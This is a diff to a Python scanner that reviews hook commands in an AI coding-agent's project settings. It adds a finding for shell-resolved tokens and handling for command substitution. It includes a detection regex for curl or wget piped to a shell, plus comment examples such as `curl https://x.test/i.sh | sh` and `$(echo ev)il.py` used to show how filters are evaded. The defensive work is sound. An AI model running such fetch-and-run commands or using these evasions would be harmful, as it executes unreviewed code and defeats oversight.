@@ -1500,7 +1500,17 @@ HOOK_CODES = {
     "H7": "detaches a background process that outlives the call",
     "H8": "registered, but its script is missing — python3 on a missing file exits 2, which the "
           "harness reads as *block*, so every matching call is refused",
+    "H9": "a shell resolves this command and we cannot: what it runs was not reviewed",
 }
+
+# What the harness expands and `shlex` does not. A token still carrying any of these after our own
+# substitution is resolved by the shell at run time, so the path we would compute is fiction.
+SHELL_SYNTAX = re.compile(r"[$`*?\[]")
+# Command substitution does not just expand differently — it TOKENISES differently. `shlex` splits
+# `$(echo ev)il.py` on the inner space into `$(echo` and `ev)il.py`, and the second piece carries no
+# shell syntax at all, so a per-token filter waves it through. When a command contains one, nothing
+# in it is a path we resolved.
+SUBSTITUTION = re.compile(r"\$\(|`")
 
 HOOK_RULES: list[tuple[str, str, re.Pattern]] = [
     ("H1", "block", re.compile(r"(?:curl|wget)[^|\n]{0,200}\|\s*(?:sudo\s+)?(?:sh|bash|zsh)")),
@@ -1537,24 +1547,37 @@ def hook_entries(root: Path) -> list[tuple[str, str, str]]:
     return out
 
 
-def hook_scripts(root: Path, command: str) -> list[Path]:
+def hook_scripts(root: Path, command: str) -> tuple[list[Path], list[str]]:
     """EVERY file a hook runs, not the first.
 
     The first version returned one, so `python3 good.py && python3 evil.py` was reviewed by reading
     `good.py`. A command is a command line, not a command."""
-    expanded = command.replace('"$CLAUDE_PROJECT_DIR"', str(root)).replace("$CLAUDE_PROJECT_DIR", str(root))
+    # `${VAR}` is the form the harness expands and our first version did not: the token kept the
+    # braces, the path could not exist, and the hook earned an H8 "missing" while the real script
+    # ran unread. A false positive and a bypass in one line.
+    expanded = command
+    for form in ('"${CLAUDE_PROJECT_DIR}"', "${CLAUDE_PROJECT_DIR}", '"$CLAUDE_PROJECT_DIR"', "$CLAUDE_PROJECT_DIR"):
+        expanded = expanded.replace(form, str(root))
     try:
         tokens = shlex.split(expanded, posix=True) if expanded.strip() else []
     except ValueError:            # an unbalanced quote: fall back to whitespace, never to silence
         tokens = expanded.split()
-    out = []
+    if SUBSTITUTION.search(expanded):
+        return [], [command.strip()]
+    out, unresolved = [], []
     for token in tokens:
         # `curl https://x.test/i.sh | sh` ends in `.sh` and is not a path. A URL is a URL.
         if "://" in token:
             continue
-        if re.search(r"\.(?:py|mjs|cjs|js|ts|sh)$", token):
-            out.append(Path(token) if Path(token).is_absolute() else root / token)
-    return out
+        if not re.search(r"\.(?:py|mjs|cjs|js|ts|sh)$", token):
+            continue
+        if SHELL_SYNTAX.search(token):
+            # `$HOME/x.py`, `ev*.py`, `$(echo ev)il.py`: the shell resolves these and we do not.
+            # Computing a path from the literal text invents a file, then reports it missing.
+            unresolved.append(token)
+            continue
+        out.append(Path(token) if Path(token).is_absolute() else root / token)
+    return out, unresolved
 
 
 def review_hooks(root: Path) -> list[Finding]:
@@ -1566,7 +1589,9 @@ def review_hooks(root: Path) -> list[Finding]:
             if pat.search(command) and code not in seen:
                 seen.add(code)
                 found.append(Finding(code, level, event, HOOK_CODES[code], command[:150]))
-        scripts = hook_scripts(root, command)
+        scripts, unresolved = hook_scripts(root, command)
+        for token in unresolved:
+            found.append(Finding("H9", "review", event, HOOK_CODES["H9"], f"{where}: {token}"))
         if not scripts:
             # An inline shell command, already judged by the rules above. H6 asks where a SCRIPT
             # lives; saying it of a command that has none is a finding with no action behind it.
